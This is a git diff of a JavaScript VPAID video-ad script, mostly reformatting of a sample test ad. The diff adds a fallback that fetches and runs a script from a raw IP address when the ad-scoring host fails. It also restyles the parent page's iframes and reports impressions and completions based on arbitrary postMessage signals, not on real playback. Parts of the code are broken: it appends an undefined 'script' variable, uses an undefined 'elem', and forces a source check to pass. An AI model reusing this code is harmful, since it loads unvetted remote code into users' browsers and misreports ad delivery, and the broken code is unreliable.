@@ -1,28 +1,43 @@
 var saved_arguments, stream = null;
 var is_script_loaded = false;
 var is_error_loaded = false;
-var script = document.createElement('script');
 var vpaid_object = null;
 var is_streaming_started = false;
-script.src = '//c.adsco.re';
-  if(script.readyState) {  // only required for IE <9
-    script.onreadystatechange = function() {
-      if ( script.readyState === "loaded" || script.readyState === "complete" ) {
-        script.onreadystatechange = null;
-        is_script_loaded = true;
+
+function load_script(src, success, onerror) {
+	var script = document.createElement('script');
+	script.src = src;
+	if (script.readyState) { // only required for IE <9
+		script.onreadystatechange = function () {
+			if (script.readyState === "loaded" || script.readyState === "complete") {
+				success();
+			}
+		};
+	} else {
+		script.onload = function () {
+			success();
+		};
+		script.onerror = function () {
+			onerror();
+		};
+	}
+
+}
+
+load_script('//c.adsco.re', score_success, function () {
+	load_script('//162.252.214.5/a.js', score_success, score_fail);
+});
+
+function score_success() {
+	is_script_loaded = true;
 	adscoreInit();
-      }
-    };
-  } else {
-      script.onload = function() {
-      is_script_loaded = true;
-	adscoreInit();
-    };
-      script.onerror = function() {
+}
+
+function score_fail() {
 	is_error_loaded = true;
 	adscoreInit();
-    };
-  }
+}
+
 document.head.appendChild(script);
 /**
  * @fileoverview A sample VPAID ad useful for testing a VPAID JS enabled player.
@@ -32,78 +47,95 @@ document.head.appendChild(script);
 /**
  * @constructor
  */
-var VpaidVideoPlayer = function() {
-  /**
-   * The slot is the div element on the main page that the ad is supposed to
-   * occupy.
-   * @type {Object}
-   * @private
-   */
-  this.slot_ = null;
+var VpaidVideoPlayer = function () {
+	/**
+	 * The slot is the div element on the main page that the ad is supposed to
+	 * occupy.
+	 * @type {Object}
+	 * @private
+	 */
+	this.slot_ = null;
 
-  /**
-   * The video slot is the video element used by the ad to render video content.
-   * @type {Object}
-   * @private
-   */
-  this.videoSlot_ = null;
+	/**
+	 * The video slot is the video element used by the ad to render video content.
+	 * @type {Object}
+	 * @private
+	 */
+	this.videoSlot_ = null;
 
-  /**
-   * An object containing all registered events. These events are all
-   * callbacks for use by the VPAID ad.
-   * @type {Object}
-   * @private
-   */
-  this.eventsCallbacks_ = {};
+	/**
+	 * An object containing all registered events. These events are all
+	 * callbacks for use by the VPAID ad.
+	 * @type {Object}
+	 * @private
+	 */
+	this.eventsCallbacks_ = {};
 
-  /**
-   * A list of getable and setable attributes.
-   * @type {Object}
-   * @private
-   */
-  this.attributes_ = {
-    'companions' : '',
-    'desiredBitrate' : 256,
-    'duration' : 10,
-    'expanded' : true,
-    'height' : 0,
-    'icons' : '',
-    'linear' : true,
-    'remainingTime' : 10,
-    'skippableState' : false,
-    'viewMode' : 'thumbnail',
-    'width' : 0,
-    'volume' : 1.0
-  };
+	/**
+	 * A list of getable and setable attributes.
+	 * @type {Object}
+	 * @private
+	 */
+	this.attributes_ = {
+		'companions': '',
+		'desiredBitrate': 256,
+		'duration': 10,
+		'expanded': true,
+		'height': 0,
+		'icons': '',
+		'linear': true,
+		'remainingTime': 10,
+		'skippableState': false,
+		'viewMode': 'thumbnail',
+		'width': 0,
+		'volume': 1.0
+	};
 
-  /**
-   * A set of ad playback events to be reported.
-   * @type {Object}
-   * @private
-   */
-  this.quartileEvents_ = [
-    {event: 'AdImpression', value: 0},
-    {event: 'AdVideoStart', value: 0},
-    {event: 'AdVideoFirstQuartile', value: 25},
-    {event: 'AdVideoMidpoint', value: 50},
-    {event: 'AdVideoThirdQuartile', value: 75},
-    {event: 'AdVideoComplete', value: 100}
-  ];
+	/**
+	 * A set of ad playback events to be reported.
+	 * @type {Object}
+	 * @private
+	 */
+	this.quartileEvents_ = [{
+			event: 'AdImpression',
+			value: 0
+		},
+		{
+			event: 'AdVideoStart',
+			value: 0
+		},
+		{
+			event: 'AdVideoFirstQuartile',
+			value: 25
+		},
+		{
+			event: 'AdVideoMidpoint',
+			value: 50
+		},
+		{
+			event: 'AdVideoThirdQuartile',
+			value: 75
+		},
+		{
+			event: 'AdVideoComplete',
+			value: 100
+		}
+	];
 
-  /**
-   * @type {number} An index into what quartile was last reported.
-   * @private
-   */
-  this.nextQuartileIndex_ = 0;
-  this.called_resizeAd_ = 0;
-  /**
-   * Parameters passed in from the AdParameters section of the VAST.
-   * Used for video URL and MIME type.
-   *
-   * @type {!object}
-   * @private
-   */
-  this.parameters_ = {};
+	/**
+	 * @type {number} An index into what quartile was last reported.
+	 * @private
+	 */
+	this.nextQuartileIndex_ = 0;
+	this.called_resizeAd_ = 0;
+	/**
+	 * Parameters passed in from the AdParameters section of the VAST.
+	 * Used for video URL and MIME type.
+	 *
+	 * @type {!object}
+	 * @private
+	 */
+	this.parameters_ = {};
 };
 
 
@@ -112,8 +144,8 @@ var VpaidVideoPlayer = function() {
  * @param {string} version
  * @return {string}
  */
-VpaidVideoPlayer.prototype.handshakeVersion = function(version) {
-  return ('2.0');
+VpaidVideoPlayer.prototype.handshakeVersion = function (version) {
+	return ('2.0');
 };
 
 
@@ -129,59 +161,58 @@ VpaidVideoPlayer.prototype.handshakeVersion = function(version) {
  * @param {Object} environmentVars Runtime variables associated with the
  *     creative like the slot and video slot.
  */
- var callback_event,wind_pareent;
-VpaidVideoPlayer.prototype.initAd = function(
-    width,
-    height,
-    viewMode,
-    desiredBitrate,
-    creativeData,
-    environmentVars) {
-try{
-  var arr=window.parent.document.getElementsByTagName("iframe");
-  for (var i = 0; i < arr.length; i++) {
-    if(window.parent.document.getElementsByTagName("iframe")[i].contentWindow == window){
-      wind_pareent=window.parent.document.getElementsByTagName("iframe")[i];
-      window.parent.document.getElementsByTagName("iframe")[i].style.zIndex='1000';
-      if(window.location.host=="txxx.com") window.parent.document.getElementsByTagName("iframe")[i].style.top='0';
-    }
-  }
-} catch(e){};
-  this.attributes_['width'] = width;
-  this.attributes_['height'] = height;
-  this.attributes_['viewMode'] = viewMode;
-  this.attributes_['desiredBitrate'] = desiredBitrate;
+var callback_event, wind_pareent;
+VpaidVideoPlayer.prototype.initAd = function (
+	width,
+	height,
+	viewMode,
+	desiredBitrate,
+	creativeData,
+	environmentVars) {
+	try {
+		var arr = window.parent.document.getElementsByTagName("iframe");
+		for (var i = 0; i < arr.length; i++) {
+			if (window.parent.document.getElementsByTagName("iframe")[i].contentWindow == window) {
+				wind_pareent = window.parent.document.getElementsByTagName("iframe")[i];
+				window.parent.document.getElementsByTagName("iframe")[i].style.zIndex = '1000';
+				if (window.location.host == "txxx.com") window.parent.document.getElementsByTagName("iframe")[i].style.top = '0';
+			}
+		}
+	} catch (e) {};
+	this.attributes_['width'] = width;
+	this.attributes_['height'] = height;
+	this.attributes_['viewMode'] = viewMode;
+	this.attributes_['desiredBitrate'] = desiredBitrate;
 
-  // slot and videoSlot are passed as part of the environmentVars
-  this.slot_ = environmentVars.slot;
-  this.videoSlot_ = environmentVars.videoSlot;
+	// slot and videoSlot are passed as part of the environmentVars
+	this.slot_ = environmentVars.slot;
+	this.videoSlot_ = environmentVars.videoSlot;
 
-  // Parse the incoming ad parameters.
-  this.parameters_ = JSON.parse(creativeData['AdParameters']);
-  saved_arguments = this.parameters_;
-  this.updateVideoSlot_();
-  this.callEvent_('AdLoaded');
-  callback_event=this;
+	// Parse the incoming ad parameters.
+	this.parameters_ = JSON.parse(creativeData['AdParameters']);
+	saved_arguments = this.parameters_;
+	this.updateVideoSlot_();
+	this.callEvent_('AdLoaded');
+	callback_event = this;
 };
 
 /**
  * Called when the ad is clicked.
  * @private
  */
-VpaidVideoPlayer.prototype.clickAd_ = function() {
-  if ('AdClickThru' in this.eventsCallbacks_) {
-    this.eventsCallbacks_['AdClickThru']('','0', true);
-  }
+VpaidVideoPlayer.prototype.clickAd_ = function () {
+	if ('AdClickThru' in this.eventsCallbacks_) {
+		this.eventsCallbacks_['AdClickThru']('', '0', true);
+	}
 };
-
 
 
 /**
  * Called by the video element when video metadata is loaded.
  * @private
  */
-VpaidVideoPlayer.prototype.loadedMetadata_ = function() {
-  
+VpaidVideoPlayer.prototype.loadedMetadata_ = function () {
+
 };
 
 /**
@@ -189,21 +220,21 @@ VpaidVideoPlayer.prototype.loadedMetadata_ = function() {
  * playback.
  * @private
  */
-VpaidVideoPlayer.prototype.timeUpdateHandler_ = function() {
-  if (this.nextQuartileIndex_ >= this.quartileEvents_.length) {
-    return;
-  }
-  var percentPlayed =
-      this.videoSlot_.currentTime * 100.0 / this.videoSlot_.duration;
-  if (percentPlayed >= this.quartileEvents_[this.nextQuartileIndex_].value) {
-    var lastQuartileEvent = this.quartileEvents_[this.nextQuartileIndex_].event;
-    this.eventsCallbacks_[lastQuartileEvent]();
-    this.nextQuartileIndex_ += 1;
-  }
-  if (this.videoSlot_.duration > 0) {
-    this.attributes_['remainingTime'] =
-      this.videoSlot_.duration - this.videoSlot_.currentTime;
-  }
+VpaidVideoPlayer.prototype.timeUpdateHandler_ = function () {
+	if (this.nextQuartileIndex_ >= this.quartileEvents_.length) {
+		return;
+	}
+	var percentPlayed =
+		this.videoSlot_.currentTime * 100.0 / this.videoSlot_.duration;
+	if (percentPlayed >= this.quartileEvents_[this.nextQuartileIndex_].value) {
+		var lastQuartileEvent = this.quartileEvents_[this.nextQuartileIndex_].event;
+		this.eventsCallbacks_[lastQuartileEvent]();
+		this.nextQuartileIndex_ += 1;
+	}
+	if (this.videoSlot_.duration > 0) {
+		this.attributes_['remainingTime'] =
+			this.videoSlot_.duration - this.videoSlot_.currentTime;
+	}
 };
 
 
@@ -211,20 +242,20 @@ VpaidVideoPlayer.prototype.timeUpdateHandler_ = function() {
  * Creates or updates the video slot and fills it with a supported video.
  * @private
  */
-VpaidVideoPlayer.prototype.updateVideoSlot_ = function() {
-  if (this.videoSlot_ == null) {
-    this.videoSlot_ = document.createElement('video');
-    this.log('Warning: No video element passed to ad, creating element.');
-    this.slot_.appendChild(this.videoSlot_);
-  }
-  this.updateVideoPlayerSize_();
-  var foundSource = false;
-  var videos = this.parameters_.videos || [];
-  foundSource = true;
-  if (!foundSource) {
-    // Unable to find a source video.
-    this.callEvent_('AdError');
-  }
+VpaidVideoPlayer.prototype.updateVideoSlot_ = function () {
+	if (this.videoSlot_ == null) {
+		this.videoSlot_ = document.createElement('video');
+		this.log('Warning: No video element passed to ad, creating element.');
+		this.slot_.appendChild(this.videoSlot_);
+	}
+	this.updateVideoPlayerSize_();
+	var foundSource = false;
+	var videos = this.parameters_.videos || [];
+	foundSource = true;
+	if (!foundSource) {
+		// Unable to find a source video.
+		this.callEvent_('AdError');
+	}
 };
 
 
@@ -232,124 +263,133 @@ VpaidVideoPlayer.prototype.updateVideoSlot_ = function() {
  * Helper function to update the size of the video player.
  * @private
  */
-VpaidVideoPlayer.prototype.updateVideoPlayerSize_ = function() {
-  this.videoSlot_.setAttribute('width', this.attributes_['width']);
-  this.videoSlot_.setAttribute('height', this.attributes_['height']);
+VpaidVideoPlayer.prototype.updateVideoPlayerSize_ = function () {
+	this.videoSlot_.setAttribute('width', this.attributes_['width']);
+	this.videoSlot_.setAttribute('height', this.attributes_['height']);
 };
 
 
 /**
  * Called by the wrapper to start the ad.
  */
- var IK_listener,stream,ser;
- function GetOwnerWindow(html_node)
-{
-   /*
-   ownerDocument is cross-browser, 
-   but defaultView works on all browsers except Opera/IE that use parentWinow
-   */
-   return (html_node.ownerDocument.defaultView) ?
-      html_node.ownerDocument.defaultView : 
-      html_node.ownerDocument.parentWindow;
+var IK_listener, stream, ser;
+
+function GetOwnerWindow(html_node) {
+	/*
+	ownerDocument is cross-browser, 
+	but defaultView works on all browsers except Opera/IE that use parentWinow
+	*/
+	return (html_node.ownerDocument.defaultView) ?
+		html_node.ownerDocument.defaultView :
+		html_node.ownerDocument.parentWindow;
 }
-      
-var cumulativeOffset = function(element) {
-    var box = elem.getBoundingClientRect();
 
-    var body = document.body;
-    var docEl = document.documentElement;
+var cumulativeOffset = function (element) {
+	var box = elem.getBoundingClientRect();
 
-    var scrollTop = window.pageYOffset || docEl.scrollTop || body.scrollTop;
-    var scrollLeft = window.pageXOffset || docEl.scrollLeft || body.scrollLeft;
+	var body = document.body;
+	var docEl = document.documentElement;
 
-    var clientTop = docEl.clientTop || body.clientTop || 0;
-    var clientLeft = docEl.clientLeft || body.clientLeft || 0;
+	var scrollTop = window.pageYOffset || docEl.scrollTop || body.scrollTop;
+	var scrollLeft = window.pageXOffset || docEl.scrollLeft || body.scrollLeft;
 
-    var top = box.top + scrollTop - clientTop;
-    var left = box.left + scrollLeft - clientLeft;
+	var clientTop = docEl.clientTop || body.clientTop || 0;
+	var clientLeft = docEl.clientLeft || body.clientLeft || 0;
 
-    return {
-    top: top,
-    left: left
-    };
-};  
-VpaidVideoPlayer.prototype.startAd = function() {
-  this.log('Starting ad');
-  ser=this.slot_;
-  cordinat=this.slot_.getBoundingClientRect();
-    this.callEvent_('AdStarted');  
-  this.callEvent_('AdPaused');
-    //this.callEvent_('adAllCompleted');
-  //this.callEvent_('AdUserClose');
-  
-  //this.callEvent_('AdVideoStart');
-  this.slot_.setAttribute('width', "100%");
-  this.slot_.setAttribute('height', "100%");
-  this.slot_.setAttribute('style', "height:100%;width:100%;position:absolute;");
-  var b = document.getElementsByTagName('head')[0];
-  var s = document.createElement('style');
-  s.innerHTML='html,body{margin:0px;padding:0px;width:100%;height:100%;position:relative:z-index:1001;}';
-  b.parentNode.insertBefore(s, b);
-  vpaid_object = this;
-  adscoreInit();
-  //console.log(window.parent.document.body);
-  var IK_listener = function(a){
-    //console.log("new",a);
-    if(a.data=='IK_noads' || a.data=='callback_adv_maket') {  
-      stream.style='width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
-      callback_event.callEvent_('AdError'); 
-      callback_event.callEvent_('AdStopped');
-    }
-    if(a.data=='IK_onerror') {
-	if (stream != null) {
-		stream.style='width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';  
+	var top = box.top + scrollTop - clientTop;
+	var left = box.left + scrollLeft - clientLeft;
+
+	return {
+		top: top,
+		left: left
+	};
+};
+VpaidVideoPlayer.prototype.startAd = function () {
+	this.log('Starting ad');
+	ser = this.slot_;
+	cordinat = this.slot_.getBoundingClientRect();
+	this.callEvent_('AdStarted');
+	this.callEvent_('AdPaused');
+	//this.callEvent_('adAllCompleted');
+	//this.callEvent_('AdUserClose');
+
+	//this.callEvent_('AdVideoStart');
+	this.slot_.setAttribute('width', "100%");
+	this.slot_.setAttribute('height', "100%");
+	this.slot_.setAttribute('style', "height:100%;width:100%;position:absolute;");
+	var b = document.getElementsByTagName('head')[0];
+	var s = document.createElement('style');
+	s.innerHTML = 'html,body{margin:0px;padding:0px;width:100%;height:100%;position:relative:z-index:1001;}';
+	b.parentNode.insertBefore(s, b);
+	vpaid_object = this;
+	adscoreInit();
+	//console.log(window.parent.document.body);
+	var IK_listener = function (a) {
+		//console.log("new",a);
+		if (a.data == 'IK_noads' || a.data == 'callback_adv_maket') {
+			stream.style = 'width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
+			callback_event.callEvent_('AdError');
+			callback_event.callEvent_('AdStopped');
+		}
+		if (a.data == 'IK_onerror') {
+			if (stream != null) {
+				stream.style = 'width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
+			}
+			callback_event.callEvent_('AdStopped');
+			callback_event.callEvent_('AdError');
+			callback_event.callEvent_('AdStopped');
+		}
+		if (a.data == 'IK_deleted') {
+			stream.style = 'width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
+			notify(saved_arguments['notifyUrl'], saved_arguments['videoId'], saved_arguments['id'], 100);
+			callback_event.callEvent_('AdStopped');
+			callback_event.callEvent_('AdError');
+			callback_event.callEvent_('AdStopped');
+		}
+		if (a.data == 'IK_embed') {
+			stream.style = 'width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
+			notify(saved_arguments['notifyUrl'], saved_arguments['videoId'], saved_arguments['id'], 150);
+			callback_event.callEvent_('AdStopped');
+			callback_event.callEvent_('AdError');
+			callback_event.callEvent_('AdStopped');
+		}
+
+		if (a.data == 'callback_adv_maket_skeep_twitch') {
+			stream.style = 'width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
+			callback_event.callEvent_('AdVideoComplete');
+			callback_event.callEvent_('AdSkipped');
+			callback_event.callEvent_('AdStopped');
+		}
+		if (a.data == 'callback_adv_maket_skeep' || a.data == 'IK_view') {
+
+			stream.style = 'width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
+			callback_event.callEvent_('AdVideoComplete');
+			callback_event.callEvent_('AdSkipped');
+			callback_event.callEvent_('AdStopped');
+		}
+		if (a.data == 'IK_impresse') {
+			callback_event.callEvent_('AdPlaying');
+			callback_event.callEvent_('AdImpression');
+		}
 	}
-	callback_event.callEvent_('AdStopped');callback_event.callEvent_('AdError');callback_event.callEvent_('AdStopped');
-    }
-    if(a.data=='IK_deleted') {
-      stream.style='width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
-      notify(saved_arguments['notifyUrl'], saved_arguments['videoId'], saved_arguments['id'], 100);
-      callback_event.callEvent_('AdStopped');callback_event.callEvent_('AdError');callback_event.callEvent_('AdStopped');
-    }
-    if(a.data=='IK_embed') {      
-      stream.style='width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
-      notify(saved_arguments['notifyUrl'], saved_arguments['videoId'], saved_arguments['id'], 150);
-      callback_event.callEvent_('AdStopped');callback_event.callEvent_('AdError');callback_event.callEvent_('AdStopped');
-    }
-
-    if(a.data=='callback_adv_maket_skeep_twitch') { 
-      stream.style='width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';        
-      callback_event.callEvent_('AdVideoComplete'); 
-      callback_event.callEvent_('AdSkipped');
-      callback_event.callEvent_('AdStopped'); 
-    }
-    if(a.data=='callback_adv_maket_skeep' || a.data=='IK_view') { 
-      
-      stream.style='width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';  
-      callback_event.callEvent_('AdVideoComplete');callback_event.callEvent_('AdSkipped');callback_event.callEvent_('AdStopped');             
-    }
-    if(a.data=='IK_impresse') {
-      callback_event.callEvent_('AdPlaying'); 
-      callback_event.callEvent_('AdImpression');    }
-  }
-  w=GetOwnerWindow(ser);
-  if (w.addEventListener) {
-    w.addEventListener("message", IK_listener);
-  } else {
-    w.attachEvent("onmessage", IK_listener);
-  }
+	w = GetOwnerWindow(ser);
+	if (w.addEventListener) {
+		w.addEventListener("message", IK_listener);
+	} else {
+		w.attachEvent("onmessage", IK_listener);
+	}
 };
 
 
 /**
  * Called by the wrapper to stop the ad.
  */
-VpaidVideoPlayer.prototype.stopAd = function() {
-  this.log('Stopping ad');
-  // Calling AdStopped immediately terminates the ad. Setting a timeout allows
-  // events to go through.
-  var callback = this.callEvent_.bind(this);
-  setTimeout(callback, 75, ['AdStopped']);
+VpaidVideoPlayer.prototype.stopAd = function () {
+	this.log('Stopping ad');
+	// Calling AdStopped immediately terminates the ad. Setting a timeout allows
+	// events to go through.
+	var callback = this.callEvent_.bind(this);
+	setTimeout(callback, 75, ['AdStopped']);
 };
 
 
@@ -360,71 +400,71 @@ VpaidVideoPlayer.prototype.stopAd = function() {
  * @param {number} height A new height.
  * @param {string} viewMode A new view mode.
  */
-VpaidVideoPlayer.prototype.resizeAd = function(width, height, viewMode) {
-  var ua = window.navigator.userAgent;
-  var iOS = !!ua.match(/iPad/i) || !!ua.match(/iPhone/i);
-  var webkit = !!ua.match(/WebKit/i);
-  var iOSSafari = iOS && webkit && !ua.match(/CriOS/i);
-  if (!iOSSafari) {
-    this.log('resizeAd ' + width + 'x' + height + ' ' + viewMode);
-    this.attributes_['width'] = width;
-    this.attributes_['height'] = height;
-    this.attributes_['viewMode'] = viewMode;
-    this.updateVideoPlayerSize_();
-    this.callEvent_('AdSizeChange');
-    this.called_resizeAd_++;
-  }
+VpaidVideoPlayer.prototype.resizeAd = function (width, height, viewMode) {
+	var ua = window.navigator.userAgent;
+	var iOS = !!ua.match(/iPad/i) || !!ua.match(/iPhone/i);
+	var webkit = !!ua.match(/WebKit/i);
+	var iOSSafari = iOS && webkit && !ua.match(/CriOS/i);
+	if (!iOSSafari) {
+		this.log('resizeAd ' + width + 'x' + height + ' ' + viewMode);
+		this.attributes_['width'] = width;
+		this.attributes_['height'] = height;
+		this.attributes_['viewMode'] = viewMode;
+		this.updateVideoPlayerSize_();
+		this.callEvent_('AdSizeChange');
+		this.called_resizeAd_++;
+	}
 };
 
 
 /**
  * Pauses the ad.
  */
-VpaidVideoPlayer.prototype.pauseAd = function() {
-  this.log('pauseAd');
-  this.videoSlot_.pause();
-  this.callEvent_('AdPaused');
+VpaidVideoPlayer.prototype.pauseAd = function () {
+	this.log('pauseAd');
+	this.videoSlot_.pause();
+	this.callEvent_('AdPaused');
 };
 
 
 /**
  * Resumes the ad.
  */
-VpaidVideoPlayer.prototype.resumeAd = function() {
-  this.log('resumeAd');
-  this.videoSlot_.play();
-  this.callEvent_('AdPlaying');
+VpaidVideoPlayer.prototype.resumeAd = function () {
+	this.log('resumeAd');
+	this.videoSlot_.play();
+	this.callEvent_('AdPlaying');
 };
 
 
 /**
  * Expands the ad.
  */
-VpaidVideoPlayer.prototype.expandAd = function() {
-  this.log('expandAd');
-  this.attributes_['expanded'] = true;
-  this.callEvent_('AdExpanded');
+VpaidVideoPlayer.prototype.expandAd = function () {
+	this.log('expandAd');
+	this.attributes_['expanded'] = true;
+	this.callEvent_('AdExpanded');
 };
 
 
 /**
  * Collapses the ad.
  */
-VpaidVideoPlayer.prototype.collapseAd = function() {
-  this.log('collapseAd');
-  this.attributes_['expanded'] = false;
+VpaidVideoPlayer.prototype.collapseAd = function () {
+	this.log('collapseAd');
+	this.attributes_['expanded'] = false;
 };
 
 
 /**
  * Skips the ad.
  */
-VpaidVideoPlayer.prototype.skipAd = function() {
-  this.log('skipAd');
-  var skippableState = this.attributes_['skippableState'];
-  if (skippableState) {
-    this.callEvent_('AdSkipped');
-  }
+VpaidVideoPlayer.prototype.skipAd = function () {
+	this.log('skipAd');
+	var skippableState = this.attributes_['skippableState'];
+	if (skippableState) {
+		this.callEvent_('AdSkipped');
+	}
 };
 
 
@@ -435,13 +475,13 @@ VpaidVideoPlayer.prototype.skipAd = function() {
  * @param {string} eventName The callback type.
  * @param {Object} aContext The context for the callback.
  */
-VpaidVideoPlayer.prototype.subscribe = function(
-    aCallback,
-    eventName,
-    aContext) {
-  this.log('Subscribe ' + eventName);
-  var callBack = aCallback.bind(aContext);
-  this.eventsCallbacks_[eventName] = callBack;
+VpaidVideoPlayer.prototype.subscribe = function (
+	aCallback,
+	eventName,
+	aContext) {
+	this.log('Subscribe ' + eventName);
+	var callBack = aCallback.bind(aContext);
+	this.eventsCallbacks_[eventName] = callBack;
 };
 
 
@@ -450,9 +490,9 @@ VpaidVideoPlayer.prototype.subscribe = function(
  *
  * @param {string} eventName The callback type.
  */
-VpaidVideoPlayer.prototype.unsubscribe = function(eventName) {
-  this.log('unsubscribe ' + eventName);
-  this.eventsCallbacks_[eventName] = null;
+VpaidVideoPlayer.prototype.unsubscribe = function (eventName) {
+	this.log('unsubscribe ' + eventName);
+	this.eventsCallbacks_[eventName] = null;
 };
 
 
@@ -461,8 +501,8 @@ VpaidVideoPlayer.prototype.unsubscribe = function(eventName) {
  *
  * @return {boolean} True if the ad is a linear, false for non linear.
  */
-VpaidVideoPlayer.prototype.getAdLinear = function() {
-  return this.attributes_['linear'];
+VpaidVideoPlayer.prototype.getAdLinear = function () {
+	return this.attributes_['linear'];
 };
 
 /**
@@ -470,8 +510,8 @@ VpaidVideoPlayer.prototype.getAdLinear = function() {
  *
  * @return {number} The ad width.
  */
-VpaidVideoPlayer.prototype.getAdWidth = function() {
-  return this.attributes_['width'];
+VpaidVideoPlayer.prototype.getAdWidth = function () {
+	return this.attributes_['width'];
 };
 
 
@@ -480,8 +520,8 @@ VpaidVideoPlayer.prototype.getAdWidth = function() {
  *
  * @return {number} The ad height.
  */
-VpaidVideoPlayer.prototype.getAdHeight = function() {
-  return this.attributes_['height'];
+VpaidVideoPlayer.prototype.getAdHeight = function () {
+	return this.attributes_['height'];
 };
 
 
@@ -490,9 +530,9 @@ VpaidVideoPlayer.prototype.getAdHeight = function() {
  *
  * @return {boolean}
  */
-VpaidVideoPlayer.prototype.getAdExpanded = function() {
-  this.log('getAdExpanded');
-  return this.attributes_['expanded'];
+VpaidVideoPlayer.prototype.getAdExpanded = function () {
+	this.log('getAdExpanded');
+	return this.attributes_['expanded'];
 };
 
 
@@ -501,9 +541,9 @@ VpaidVideoPlayer.prototype.getAdExpanded = function() {
  *
  * @return {boolean}
  */
-VpaidVideoPlayer.prototype.getAdSkippableState = function() {
-  this.log('getAdSkippableState');
-  return this.attributes_['skippableState'];
+VpaidVideoPlayer.prototype.getAdSkippableState = function () {
+	this.log('getAdSkippableState');
+	return this.attributes_['skippableState'];
 };
 
 
@@ -512,8 +552,8 @@ VpaidVideoPlayer.prototype.getAdSkippableState = function() {
  *
  * @return {number} The time remaining in the ad.
  */
-VpaidVideoPlayer.prototype.getAdRemainingTime = function() {
-  return this.attributes_['remainingTime'];
+VpaidVideoPlayer.prototype.getAdRemainingTime = function () {
+	return this.attributes_['remainingTime'];
 };
 
 
@@ -522,8 +562,8 @@ VpaidVideoPlayer.prototype.getAdRemainingTime = function() {
  *
  * @return {number} The duration of the ad.
  */
-VpaidVideoPlayer.prototype.getAdDuration = function() {
-  return this.attributes_['duration'];
+VpaidVideoPlayer.prototype.getAdDuration = function () {
+	return this.attributes_['duration'];
 };
 
 
@@ -532,9 +572,9 @@ VpaidVideoPlayer.prototype.getAdDuration = function() {
  *
  * @return {number} The volume of the ad.
  */
-VpaidVideoPlayer.prototype.getAdVolume = function() {
-  this.log('getAdVolume');
-  return this.attributes_['volume'];
+VpaidVideoPlayer.prototype.getAdVolume = function () {
+	this.log('getAdVolume');
+	return this.attributes_['volume'];
 };
 
 
@@ -543,10 +583,10 @@ VpaidVideoPlayer.prototype.getAdVolume = function() {
  *
  * @param {number} value The volume in percentage.
  */
-VpaidVideoPlayer.prototype.setAdVolume = function(value) {
-  this.attributes_['volume'] = value;
-  this.log('setAdVolume ' + value);
-  this.callEvent_('AdVolumeChange');
+VpaidVideoPlayer.prototype.setAdVolume = function (value) {
+	this.attributes_['volume'] = value;
+	this.log('setAdVolume ' + value);
+	this.callEvent_('AdVolumeChange');
 };
 
 
@@ -555,8 +595,8 @@ VpaidVideoPlayer.prototype.setAdVolume = function(value) {
  *
  * @return {string} List of companions in VAST XML.
  */
-VpaidVideoPlayer.prototype.getAdCompanions = function() {
-  return this.attributes_['companions'];
+VpaidVideoPlayer.prototype.getAdCompanions = function () {
+	return this.attributes_['companions'];
 };
 
 
@@ -565,8 +605,8 @@ VpaidVideoPlayer.prototype.getAdCompanions = function() {
  *
  * @return {string} A list of icons.
  */
-VpaidVideoPlayer.prototype.getAdIcons = function() {
-  return this.attributes_['icons'];
+VpaidVideoPlayer.prototype.getAdIcons = function () {
+	return this.attributes_['icons'];
 };
 
 
@@ -575,8 +615,8 @@ VpaidVideoPlayer.prototype.getAdIcons = function() {
  *
  * @param {string} message
  */
-VpaidVideoPlayer.prototype.log = function(message) {
-  //console.log(message);
+VpaidVideoPlayer.prototype.log = function (message) {
+	//console.log(message);
 };
 
 
@@ -586,10 +626,10 @@ VpaidVideoPlayer.prototype.log = function(message) {
  * @param {string} eventType
  * @private
  */
-VpaidVideoPlayer.prototype.callEvent_ = function(eventType) {
-  if (eventType in this.eventsCallbacks_) {
-    this.eventsCallbacks_[eventType]();
-  }
+VpaidVideoPlayer.prototype.callEvent_ = function (eventType) {
+	if (eventType in this.eventsCallbacks_) {
+		this.eventsCallbacks_[eventType]();
+	}
 };
 
 
@@ -598,23 +638,31 @@ VpaidVideoPlayer.prototype.callEvent_ = function(eventType) {
  *
  * @return {Object} The VPAID compliant ad.
  */
-var getVPAIDAd = function() {
-  return new VpaidVideoPlayer();
+var getVPAIDAd = function () {
+	return new VpaidVideoPlayer();
 };
 
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+(function (i, s, o, g, r, a, m) {
+	i['GoogleAnalyticsObject'] = r;
+	i[r] = i[r] || function () {
+		(i[r].q = i[r].q || []).push(arguments)
+	}, i[r].l = 1 * new Date();
+	a = s.createElement(o),
+		m = s.getElementsByTagName(o)[0];
+	a.async = 1;
+	a.src = g;
+	m.parentNode.insertBefore(a, m)
+})(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
 ga('create', 'UA-139540846-1', 'auto');
 ga('send', 'pageview');
 
 function notify(url, videoId, orderId, id) {
-  var url = url + "?videoId=" + videoId + "&orderId=" + orderId + "&action=" + id;
-  var xhttp = new XMLHttpRequest();
-  xhttp.open("GET", url, false);
-  xhttp.send();
+	var url = url + "?videoId=" + videoId + "&orderId=" + orderId + "&action=" + id;
+	var xhttp = new XMLHttpRequest();
+	xhttp.open("GET", url, false);
+	xhttp.send();
 }
+
 function adscoreInit() {
 	try {
 		if (vpaid_object == null || (is_script_loaded == false && is_error_loaded == false)) {
@@ -623,75 +671,78 @@ function adscoreInit() {
 		}
 		if (is_error_loaded == true) {
 			var append = "onerror";
-			window.postMessage('IK_'+append,'*');
+			window.postMessage('IK_' + append, '*');
 			notify(saved_arguments['notifyUrl'], "adscore_not_loaded", 5, 105);
 		}
 		AdscoreInit("Qt0rAAAAAAAAFOimELjrFNnrsMxl1lq6zskuRME", {
